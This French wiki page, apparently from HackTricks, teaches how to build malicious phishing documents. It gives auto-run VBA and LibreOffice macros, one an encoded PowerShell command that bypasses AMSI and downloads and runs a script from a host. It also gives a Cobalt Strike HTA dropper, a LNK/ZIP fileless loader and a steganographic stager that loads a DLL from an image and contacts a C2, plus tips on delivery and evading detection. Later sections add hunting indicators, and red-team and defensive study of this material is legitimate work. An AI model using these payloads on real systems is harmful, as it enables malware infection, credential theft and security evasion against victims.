# Fichiers et documents de phishing

## Documents Office

Microsoft Word effectue une validation des données du fichier avant de l'ouvrir. La validation des données est effectuée sous forme d'identification de la structure des données, conformément au standard OfficeOpenXML. Si une erreur survient lors de l'identification de la structure des données, le fichier analysé ne sera pas ouvert.

Généralement, les fichiers Word contenant des macros utilisent l'extension `.docm`. Cependant, il est possible de renommer le fichier en modifiant l'extension tout en conservant leurs capacités d'exécution des macros.\
Par exemple, un fichier RTF ne prend pas en charge les macros par conception, mais un fichier DOCM renommé en RTF sera traité par Microsoft Word et pourra exécuter des macros.\
Les mêmes éléments internes et mécanismes s'appliquent à tous les logiciels de la suite Microsoft Office (Excel, PowerPoint, etc.).

Vous pouvez utiliser la commande suivante pour vérifier quelles extensions seront exécutées par certains programmes Office :
```bash
assoc | findstr /i "word excel powerp"
```
Les fichiers DOCX faisant référence à un template distant (_File –Options –Add-ins –Manage: Templates –Go_) qui inclut des macros peuvent également « exécuter » des macros.

### External Image Load

Allez à : _Insert --> Quick Parts --> Field_\
_**Categories** : Links and References, **Filed names** : includePicture, et **Filename or URL** :_ http://<ip>/whatever

![Office Documents - External Image Load: Allez à : Insert -- Quick Parts -- Field](<../../images/image (155).png>)

### Macros Backdoor

Il est possible d’utiliser des macros pour exécuter du code arbitraire depuis le document.

#### Fonctions d’autochargement

Plus elles sont courantes, plus il est probable que l’AV les détecte.

- AutoOpen()
- Document_Open()

#### Exemples de code de macros
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Supprimer manuellement les métadonnées

Allez dans **File > Info > Inspect Document > Inspect Document**, ce qui ouvrira le Document Inspector. Cliquez sur **Inspect**, puis sur **Remove All** à côté de **Document Properties and Personal Information**.

#### Extension Doc

Une fois terminé, sélectionnez la liste déroulante **Save as type** et remplacez le format **`.docx`** par Word 97-2003 **`.doc`**.\
Faites cela parce que vous **ne pouvez pas enregistrer de macros dans un `.docx`** et qu'il existe une **stigmatisation** **autour** de l'extension **`.docm`** compatible avec les macros (par exemple, l'icône miniature comporte un énorme `!` et certaines passerelles web/e-mail les bloquent entièrement). Par conséquent, cette **ancienne extension `.doc` constitue le meilleur compromis**.

#### Générateurs de macros malveillantes

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Macros auto-run LibreOffice ODT (Basic)

Les documents LibreOffice Writer peuvent intégrer des macros Basic et les exécuter automatiquement lorsque le fichier est ouvert, en associant la macro à l'événement **Open Document** (Tools → Customize → Events → Open Document → Macro…).<sup>[[1]](#references)</sup> Une simple macro de reverse shell ressemble à ceci :
```vb
Sub Shell
Shell("cmd /c powershell -enc BASE64_PAYLOAD"""")
End Sub
```
Notez les doubles guillemets (`""`) à l’intérieur de la chaîne : LibreOffice Basic les utilise pour échapper les guillemets littéraux. Ainsi, les payloads qui se terminent par `...==""")` conservent à la fois la commande interne et l’argument Shell correctement équilibrés.

Conseils de livraison :

- Enregistrez le fichier au format `.odt` et liez la macro à l’événement du document afin qu’elle s’exécute immédiatement à l’ouverture.
- Lors de l’envoi avec `swaks`, utilisez `--attach @resume.odt` (le caractère `@` est requis afin que les octets du fichier, et non la chaîne correspondant au nom du fichier, soient envoyés comme pièce jointe). Cela est essentiel lors de l’abus de serveurs SMTP qui acceptent des destinataires `RCPT TO` arbitraires sans validation.

## Fichiers HTA

Un HTA est un programme Windows qui **combine HTML et des langages de script (tels que VBScript et JScript)**. Il génère l’interface utilisateur et s’exécute comme une application « fully trusted », sans les contraintes du modèle de sécurité d’un navigateur.

Un HTA est exécuté à l’aide de **`mshta.exe`**, qui est généralement **installé** avec **Internet Explorer**, ce qui rend **`mshta` dépendant d’IE**. Par conséquent, si celui-ci a été désinstallé, les HTA ne pourront pas s’exécuter.
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## Forcer l’authentification NTLM

Il existe plusieurs façons de **forcer l’authentification NTLM « à distance »**. Par exemple, vous pouvez ajouter des **images invisibles** aux e-mails ou au HTML auxquels l’utilisateur accédera (même via un HTTP MitM ?). Vous pouvez également envoyer à la victime l’**adresse de fichiers** qui **déclencheront** une **authentification** simplement en **ouvrant le dossier**.

**Découvrez ces idées et bien d’autres dans les pages suivantes :**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

N’oubliez pas que vous pouvez non seulement voler le hash ou l’authentification, mais également **effectuer des attaques NTLM relay** :

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + Payloads intégrés dans un ZIP (fileless chain)

Les campagnes particulièrement efficaces distribuent un ZIP contenant deux documents leurres légitimes (PDF/DOCX) ainsi qu’un fichier .lnk malveillant. L’astuce consiste à stocker le loader PowerShell réel dans les octets bruts du ZIP après un marqueur unique, puis à faire extraire et exécuter le fichier .lnk entièrement en mémoire.<sup>[[2]](#references)</sup>

Déroulement typique implémenté par le one-liner PowerShell du fichier .lnk :

1) Localiser le ZIP original dans les emplacements courants : Desktop, Downloads, Documents, %TEMP%, %ProgramData% et le dossier parent du répertoire de travail actuel.
2) Lire les octets du ZIP et rechercher un marqueur codé en dur (par exemple, xFIQCV). Tout ce qui suit le marqueur constitue le payload PowerShell intégré.
3) Copier le ZIP vers %ProgramData%, l’extraire à cet emplacement et ouvrir le fichier .docx leurre pour paraître légitime.
4) Contourner AMSI pour le processus actuel : [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true
5) Désobfusquer l’étape suivante (par exemple, supprimer tous les caractères #) et l’exécuter en mémoire.

Exemple de squelette PowerShell permettant d’extraire et d’exécuter l’étape intégrée :
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- La livraison abuse souvent de sous-domaines PaaS réputés (p. ex. *.herokuapp.com) et peut filtrer les payloads (servir des ZIP bénins selon l’IP/l’UA).
- L’étape suivante déchiffre fréquemment du shellcode base64/XOR et l’exécute via Reflection.Emit + VirtualAlloc afin de réduire les artefacts sur disque.

Persistence utilisée dans la même chaîne
- COM TypeLib hijacking du contrôle Microsoft Web Browser, afin qu’IE/Explorer ou toute application qui l’intègre relance automatiquement le payload.<sup>[[2]](#references)[[4]](#references)</sup> Consultez les détails et les commandes prêtes à l’emploi ici :

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Chasse/IOCs
- Fichiers ZIP contenant la chaîne de marqueur ASCII (p. ex. xFIQCV) ajoutée à la fin des données de l’archive.
- Fichiers .lnk qui énumèrent les dossiers parent/utilisateur pour localiser le ZIP et ouvrent un document leurre.
- Altération d’AMSI via [System.Management.Automation.AmsiUtils]::amsiInitFailed.
- Threads métier de longue durée se terminant par des liens hébergés sous des domaines PaaS de confiance.

## LNK decoy-first staging → scheduled-task persistence → trusted CPL side-loading

Un autre schéma récurrent est un **`.lnk` usurpant un document** qui ouvre immédiatement un leurre bénin tout en préparant la chaîne réelle en arrière-plan.<sup>[[3]](#references)</sup>

Workflow observé :
1. Le raccourci **se fait passer pour un PDF** et utilise `conhost.exe` ou un proxy similaire pour lancer un downloader PowerShell obfusqué.
2. PowerShell fragmente les tokens évidents (`iw''r`, `g''c''i`, `r''e''n`, `c''p''i`, `&(g''cm sch*)`) afin que les détections naïves recherchant `iwr`, `gci`, `ren`, `cpi` ou `schtasks` ne détectent pas la commande.
3. Le stager télécharge d’abord le **document leurre**, l’ouvre pour la victime, puis reconstruit les fichiers malveillants en arrière-plan.
4. Les payloads peuvent être écrits avec des **extensions factices**, puis renommés en supprimant les caractères de remplissage, ce qui retarde l’apparition d’artefacts `.exe` / `.cpl` évidents.
5. La Persistence est établie avec une **tâche planifiée basée sur les minutes** qui lance un binaire hôte de confiance depuis un chemin accessible en écriture par l’utilisateur.

Indices minimaux de chasse associés à ce schéma :
```powershell
# Suspicious split-token PowerShell seen in LNK chains
iw''r
r''e''n
&(g''cm sch*) /create /Sc minute /tn GoogleErrorReport /tr "$env:PUBLIC\Fondue"
```
Une disposition de staging utile à reconnaître est :
- `C:\Users\Public\<decoy>.pdf`
- `C:\Users\Public\<trusted>.exe`
- `C:\Users\Public\<malicious>.cpl` ou `.dll`
- `C:\Windows\Tasks\<blob>.dat`

### Pourquoi le second stage est furtif

Dans l’étude de cas de Rapid7, la tâche planifiée lançait régulièrement **`Fondue.exe`** depuis `C:\Users\Public\`. Comme **`APPWIZ.cpl`** était placé à côté et exportait **`RunFODW`**, le binaire Microsoft de confiance effectuait le side-loading du CPL de l’attaquant au lieu de la copie système légitime.

Le CPL :
- Lit un blob **AES-256-CBC** depuis `C:\Windows\Tasks\editor.dat`
- Le déchiffre via **Windows CNG / `bcrypt.dll`**
- Alloue de la mémoire exécutable et y copie le shellcode déchiffré
- L’exécute indirectement en passant le pointeur du shellcode comme callback pour **`EnumUILanguagesW`**

Cette dernière étape mérite d’être recherchée séparément : les malwares évitent souvent un saut direct tel que `((void(*)())buf)()` et abusent plutôt d’une **WinAPI légitime acceptant un callback** pour transférer l’exécution.

Le payload déchiffré dans cette campagne était du shellcode **Donut**, qui mappait ensuite entièrement le PE final en mémoire et patchait **AMSI/WLDP/ETW** dans le processus courant avant de transférer l’exécution. Pour des notes plus approfondies sur le side-loading et le post-traitement résident en mémoire, voir :

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/dll-hijacking/README.md
{{#endref}}

{{#ref}}
../../windows-hardening/av-bypass.md
{{#endref}}

Pivots pratiques pour la recherche :
- `.lnk` lançant `powershell.exe` ou `conhost.exe`, suivi d’un document leurre visible.
- Téléchargements de courte durée vers **`C:\Users\Public\`**, suivis de renommages immédiats depuis des extensions fantaisistes.
- Tâches planifiées portant des noms anodins tels que `GoogleErrorReport` et s’exécutant depuis des **répertoires accessibles en écriture par l’utilisateur**.
- Binaires de confiance chargeant des fichiers **`.cpl` / `.dll`** depuis le même répertoire non système.
- Blobs texte encodés en Base64 écrits sous **`C:\Windows\Tasks\`**, puis lus par le module chargé via side-loading.

## Payloads délimités par stéganographie dans des images (PowerShell stager)

Les chaînes de loader récentes distribuent un JavaScript/VBS obfusqué qui décode et exécute un PowerShell stager encodé en Base64. Ce stager télécharge une image (souvent un GIF) contenant une DLL .NET encodée en Base64 et dissimulée sous forme de texte brut entre des marqueurs uniques de début et de fin. Le script recherche ces délimiteurs (exemples observés dans la nature : «<<sudo_png>> … <<sudo_odt>>>»), extrait le texte intermédiaire, le décode en Base64 pour obtenir des octets, charge l’assembly en mémoire et invoque une méthode d’entrée connue avec l’URL C2.<sup>[[5]](#references)</sup>

Flux de travail
- Stage 1 : Dropper JS/VBS archivé → décode le Base64 intégré → lance le PowerShell stager avec -nop -w hidden -ep bypass.
- Stage 2 : PowerShell stager → télécharge l’image, extrait le Base64 délimité par les marqueurs, charge la DLL .NET en mémoire et appelle sa méthode (par exemple, VAI) en lui transmettant l’URL C2 et les options.
- Stage 3 : Le loader récupère le payload final et l’injecte généralement via du process hollowing dans un binaire de confiance (couramment MSBuild.exe).<sup>[[7]](#references)[[8]](#references)</sup> Pour en savoir plus sur le process hollowing et l’exécution proxy via des utilitaires de confiance, voir ici :

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

Exemple PowerShell pour extraire une DLL depuis une image et invoquer une méthode .NET en mémoire :

<details>
<summary>Extracteur et loader de payload PowerShell stéganographique</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notes
- This is ATT&CK T1027.003 (steganography/marker-hiding).<sup>[[6]](#references)</sup> Les markers varient selon les campagnes.
- Le bypass AMSI/ETW et la déobfuscation des chaînes sont généralement appliqués avant le chargement de l'assembly.
- Hunting : analyser les images téléchargées à la recherche de délimiteurs connus ; identifier les accès de PowerShell aux images suivis du décodage immédiat de blobs Base64.

Voir également les outils stego et les techniques de carving :

{{#ref}}
../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

Une étape initiale récurrente est un fichier `.js` ou `.vbs` de petite taille et fortement obfusqué, livré dans une archive. Son seul objectif est de décoder une chaîne Base64 intégrée et de lancer PowerShell avec `-nop -w hidden -ep bypass` afin d'amorcer l'étape suivante via HTTPS.<sup>[[5]](#references)</sup>

Logique de base (abstraite) :
- Lire le contenu de son propre fichier
- Localiser un blob Base64 entre des chaînes parasites
- Décoder en PowerShell ASCII
- Exécuter avec `wscript.exe`/`cscript.exe` en invoquant `powershell.exe`

Indicateurs de hunting
- Pièces jointes JS/VBS archivées lançant `powershell.exe` avec `-enc`/`FromBase64String` dans la ligne de commande.
- `wscript.exe` lançant `powershell.exe -nop -w hidden` depuis des chemins temporaires utilisateur.

## Fichiers Windows permettant de voler des hashes NTLM

Consulter la page sur les **emplacements permettant de voler des identifiants NTLM** :

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [1] [HTB Job – Macro LibreOffice → webshell IIS → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)
- [2] [Check Point Research – Campagne ZipLine : une attaque de phishing sophistiquée ciblant des entreprises américaines](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Rapid7 – Malware à la Mode : suivi du tradecraft de Dropping Elephant à travers une chaîne de loaders sur le thème de la Chine](https://www.rapid7.com/blog/post/tr-malware-tracking-dropping-elephant-tradecraft-china-themed-loader-chain)
- [4] [Détourner la TypeLib – Nouvelle technique de persistance COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [5] [Unit 42 – Le loader PhantomVAI distribue une gamme d'infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [6] [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [7] [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [8] [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)
{{#include ../../banners/hacktricks-training.md}}
